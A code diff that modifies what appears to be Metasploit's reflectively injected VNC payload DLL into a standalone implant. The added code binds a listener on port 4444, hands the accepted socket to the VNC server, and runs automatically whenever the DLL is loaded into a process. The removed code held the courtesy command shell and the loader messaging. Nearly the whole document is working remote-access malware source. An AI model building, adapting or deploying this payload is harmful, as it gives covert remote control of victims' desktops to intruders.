@@ -17,71 +17,22 @@
 #define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
 #include "ReflectiveLoader.c"
 
-HANDLE hMessageMutex = NULL;
+/* init winsock */
+void winsock_init()
+{
+	WSADATA	wsaData;
+	WORD 	wVersionRequested;
+	wVersionRequested = MAKEWORD(2, 2);
+	WSAStartup(wVersionRequested, &wsaData);
+}
 
 /*
  * Post an arbitrary message back to a loader.
  */
 DWORD vncdll_postmessage( AGENT_CTX * lpAgentContext, DWORD dwMessage, BYTE * pDataBuffer, DWORD dwDataLength )
 {
-	DWORD dwResult            = ERROR_SUCCESS;
-	HANDLE hPipe              = NULL;
-	BYTE * pBuffer            = NULL;
-	char cNamedPipe[MAX_PATH] = {0};
-	DWORD dwWritten           = 0;
-	DWORD dwLength            = 0;
-
-	do
-	{
-		if( !lpAgentContext )
-			BREAK_WITH_ERROR( "[VNCDLL] vncdll_postmessage. invalid parameters", ERROR_INVALID_PARAMETER );
-		
-		dwLength = sizeof(DWORD) + sizeof(DWORD) + dwDataLength;
-
-		pBuffer = (BYTE *)malloc( dwLength );
-		if( !pBuffer )
-			BREAK_WITH_ERROR( "[VNCDLL] vncdll_postmessage. pBuffer malloc failed", ERROR_INVALID_HANDLE );
-				
-		memcpy( pBuffer, &dwMessage, sizeof(DWORD) );
-		memcpy( (pBuffer+sizeof(DWORD)), &dwDataLength, sizeof(DWORD) );
-		memcpy( (pBuffer+sizeof(DWORD)+sizeof(DWORD)), pDataBuffer, dwDataLength );
-
-		if( WaitForSingleObject( hMessageMutex, INFINITE ) != WAIT_OBJECT_0 )
-			BREAK_WITH_ERROR( "[VNCDLL] vncdll_postmessage. WaitForSingleObject failed", ERROR_INVALID_HANDLE );
-
-		_snprintf( cNamedPipe, MAX_PATH, "\\\\.\\pipe\\%08X", lpAgentContext->dwPipeName );
-
-		dprintf("[VNCDLL] vncdll_postmessage. pipe=%s, message=0x%08X, length=%d", cNamedPipe, dwMessage, dwDataLength);
-
-		while( TRUE )
-		{
-			hPipe = CreateFileA( cNamedPipe, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
-			if( hPipe != INVALID_HANDLE_VALUE )
-				break;
-
-			if( GetLastError() != ERROR_PIPE_BUSY )
-				BREAK_ON_ERROR( "[VNCDLL] vncdll_postmessage. ERROR_PIPE_BUSY" );
-
-			if( !WaitNamedPipe( cNamedPipe, 20000 ) )
-				BREAK_ON_ERROR( "[VNCDLL] vncdll_postmessage. WaitNamedPipe timedout" );
-		}
-		
-		if( dwResult == ERROR_SUCCESS )
-		{
-			if( !WriteFile( hPipe, pBuffer, dwLength, &dwWritten, NULL ) )
-				BREAK_ON_ERROR( "[VNCDLL] vncdll_postmessage. WriteFile dwMessage length failed" );
-		}
-
-	} while( 0 );
-
-	CLOSE_HANDLE( hPipe );
-
-	if( pBuffer )
-		free( pBuffer );
-		
-	ReleaseMutex( hMessageMutex );
-
-	return dwResult;
+	/* there is no loader. We do not want these messages */
+	return 0;
 }
 
 /*
@@ -106,43 +57,8 @@ VOID vncdll_unlockwindowstation( VOID )
  */
 HDESK vncdll_getinputdesktop( BOOL bSwitchStation )
 {
-	DWORD dwResult         = ERROR_ACCESS_DENIED;
-	HWINSTA hWindowStation = NULL;
-	HDESK hInputDesktop    = NULL;
-	HWND hDesktopWnd       = NULL;	
-
-	do
-	{
-		if( bSwitchStation )
-		{
-			// open the WinSta0 as some services are attached to a different window station.
-			hWindowStation = OpenWindowStation( "WinSta0", FALSE, WINSTA_ALL_ACCESS );
-			if( !hWindowStation )
-			{
-				if( RevertToSelf() )
-					hWindowStation = OpenWindowStation( "WinSta0", FALSE, WINSTA_ALL_ACCESS );
-			}
-			
-			// if we cant open the defaut input station we wont be able to take a screenshot
-			if( !hWindowStation )
-				BREAK_WITH_ERROR( "[VNCDLL] vncdll_getinputdesktop: Couldnt get the WinSta0 Window Station", ERROR_INVALID_HANDLE );
-			
-			// set the host process's window station to this sessions default input station we opened
-			if( !SetProcessWindowStation( hWindowStation ) )
-				BREAK_ON_ERROR( "[VNCDLL] vncdll_getinputdesktop: SetProcessWindowStation failed" );
-		}
-
-		// grab a handle to the default input desktop (e.g. Default or WinLogon)
-		hInputDesktop = OpenInputDesktop( 0, FALSE, MAXIMUM_ALLOWED );
-		if( !hInputDesktop )
-			BREAK_ON_ERROR( "[VNCDLL] vncdll_getinputdesktop: OpenInputDesktop failed" );
-
-		// set this threads desktop to that of this sessions default input desktop on WinSta0
-		SetThreadDesktop( hInputDesktop );
-	
-	} while( 0 );
-
-	return hInputDesktop;
+	// grab a handle to the default input desktop (e.g. Default or WinLogon)
+	return OpenInputDesktop( 0, FALSE, MAXIMUM_ALLOWED );
 }
 
 /*
@@ -150,50 +66,7 @@ HDESK vncdll_getinputdesktop( BOOL bSwitchStation )
  */
 VOID vncdll_courtesyshell( HDESK desk )
 {
-	DWORD dwResult         = ERROR_SUCCESS;
-	HWND hShell            = NULL;
-	STARTUPINFOA si        = {0};
-	PROCESS_INFORMATION pi = {0};
-	char name_win[256]     = {0};
-	char name_des[256]     = {0};
-	char name_all[1024]    = {0};
-	
-	do
-	{
-		dprintf( "[VNCDLL] vncdll_courtesyshell. desk=0x%08X", desk );
-
-		memset(name_all, 0, sizeof(name_all));
-
-		GetUserObjectInformation( GetProcessWindowStation(), UOI_NAME, &name_win, 256, NULL );
-		GetUserObjectInformation( desk, UOI_NAME, &name_des, 256, NULL );
-
-		_snprintf( name_all, sizeof(name_all)-1, "%s\\%s", name_win, name_des );
-
-		memset( &pi, 0, sizeof(PROCESS_INFORMATION) );
-		memset( &si, 0, sizeof(STARTUPINFOA) );
-
-		si.cb              = sizeof(STARTUPINFOA);
-		si.dwFlags         = STARTF_USESHOWWINDOW | STARTF_USEFILLATTRIBUTE;
-		si.wShowWindow     = SW_NORMAL;
-		si.lpDesktop       = name_all;
-		si.lpTitle         = "Metasploit Courtesy Shell (TM)";
-		si.dwFillAttribute = FOREGROUND_RED|FOREGROUND_BLUE|FOREGROUND_GREEN|BACKGROUND_BLUE;
-		
-		if( !CreateProcess( NULL, "cmd.exe", 0, 0, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi ) )
-			BREAK_ON_ERROR( "[VNCDLL] vncdll_courtesyshell. CreateProcess failed" );
-
-		CloseHandle( pi.hThread );
-		CloseHandle( pi.hProcess );
-			
-		Sleep( 1000 );
-		
-		hShell = FindWindow( NULL, "Metasploit Courtesy Shell (TM)" );
-		if( !hShell )
-			break;
-
-		SetWindowPos( hShell, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE );
-
-	} while( 0 );
+	/* absolutely not! */
 }
 
 /*
@@ -216,14 +89,9 @@ DWORD vncdll_run( AGENT_CTX * lpAgentContext )
 		if( !lpAgentContext )
 			BREAK_WITH_ERROR( "[VNCDLL] vncdll_run. invalid parameters", ERROR_INVALID_PARAMETER );
 		
-		hMessageMutex = CreateMutex( NULL, FALSE, NULL );
-
 		desk = vncdll_getinputdesktop( TRUE );
 		
 		vncdll_unlockwindowstation();
-
-		if( !lpAgentContext->bDisableCourtesyShell )
-			vncdll_courtesyshell( desk );
 
 		vsocketsystem = new VSocketSystem();
 		if( !vsocketsystem->Initialised() )
@@ -247,36 +115,7 @@ DWORD vncdll_run( AGENT_CTX * lpAgentContext )
 
 	delete vsocketsystem;
 
-	CLOSE_HANDLE( hMessageMutex );
-
 	return 0;
-}
-
-/*
- * Grab a DWORD value out of the command line.
- * e.g. vncdll_command_dword( "/FOO:0x41414141 /BAR:0xCAFEF00D", "/FOO:" ) == 0x41414141
- */
-DWORD vncdll_command_dword( char * cpCommandLine, char * cpCommand )
-{
-	char * cpString = NULL;
-	DWORD dwResult  = 0;
-
-	do
-	{
-		if( !cpCommandLine || !cpCommand )
-			break;
-		
-		cpString = strstr( cpCommandLine, cpCommand );
-		if( !cpString )
-			break;
-
-		cpString += strlen( cpCommand );
-
-		dwResult = strtoul( cpString, NULL, 0 );
-
-	} while( 0 );
-
-	return dwResult;
 }
 
 /*
@@ -284,60 +123,36 @@ DWORD vncdll_command_dword( char * cpCommandLine, char * cpCommand )
  */
 VOID vncdll_main( char * cpCommandLine )
 {
-	DWORD dwResult = ERROR_INVALID_PARAMETER;
+	DWORD dwResult;
+	AGENT_CTX context = {0};
+	SOCKET lsocket;
+	SOCKET my_socket;
+	struct sockaddr_in sock;
 
-	__try
-	{
-		do
-		{
-			dprintf( "[VNCDLL] vncdll_main. cpCommandLine=0x%08X", (DWORD)cpCommandLine );
+	/* A very quick and dirty setup to receive our connection and act on it */
+	winsock_init();
+	lsocket = socket(AF_INET, SOCK_STREAM, 0);
 
-			if( !cpCommandLine )
-				break;
+	sock.sin_family = AF_INET;
+	sock.sin_addr.s_addr = inet_addr("0.0.0.0");
+	sock.sin_port = htons(4444);
 
-			if( strlen( cpCommandLine ) == 0 )
-				break;
-					
-			dprintf( "[VNCDLL] vncdll_main. lpCmdLine=%s", cpCommandLine );
-				
-			if( strstr( cpCommandLine, "/v" ) )
-			{
-				AGENT_CTX * lpAgentContext = NULL;
+	bind(lsocket, (sockaddr *)&sock, sizeof(sock));
+	listen(lsocket, 0);
+	my_socket = accept(lsocket, 0, 0);
+	closesocket(lsocket);
 
-				lpAgentContext = (AGENT_CTX *)vncdll_command_dword( cpCommandLine, "/c:" );
+	/* setup our agent context, please */
+	WSADuplicateSocket(my_socket, GetCurrentProcessId(), &context.info);
+	context.hCloseEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+	context.bInit       = TRUE;
 
-				dwResult = vncdll_run( lpAgentContext );
+	/* kick things off */
+	dwResult = vncdll_run( &context );
 
-				if( lpAgentContext )
-				{
-					int i = 0;
-					if( lpAgentContext->hCloseEvent )
-						CloseHandle( lpAgentContext->hCloseEvent );
-					/*for( i=0 ; i<4 ; i++ )
-					{
-						if( lpAgentContext->dictionaries[i] )
-						{
-							int size = ( sizeof(DICTMSG) + lpAgentContext->dictionaries[i]->dwDictLength );
-							memset( lpAgentContext->dictionaries[i], 0, size );
-							VirtualFree( lpAgentContext->dictionaries[i], 0, MEM_RELEASE );
-						}
-					}*/
-					memset( lpAgentContext, 0, sizeof(AGENT_CTX) );
-					VirtualFree( lpAgentContext, 0, MEM_RELEASE );
-				}
-			}
-
-		} while( 0 );
-	}
-	__except( EXCEPTION_EXECUTE_HANDLER )
-	{
-		dprintf( "[VNCDLL] vncdll_main. EXCEPTION_EXECUTE_HANDLER" );
-		dwResult = ERROR_UNHANDLED_EXCEPTION;
-	}
-		
-	dprintf( "[VNCDLL=0x%08X] vncdll_main. ExitThread dwResult=%d\n\n", hAppInstance, dwResult );
-
-	ExitThread( dwResult );
+	/* clean up, when we're done */
+	closesocket(my_socket);
+	ExitProcess( dwResult );
 }
 
 /*
@@ -351,8 +166,7 @@ BOOL WINAPI DllMain( HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved )
     { 
 		case DLL_PROCESS_ATTACH:
 			hAppInstance = hInstance;
-			if( lpReserved != NULL )
-				vncdll_main( (char *)lpReserved );
+			vncdll_main((char *)lpReserved);
 			break;
 		case DLL_PROCESS_DETACH:
 		case DLL_THREAD_ATTACH:
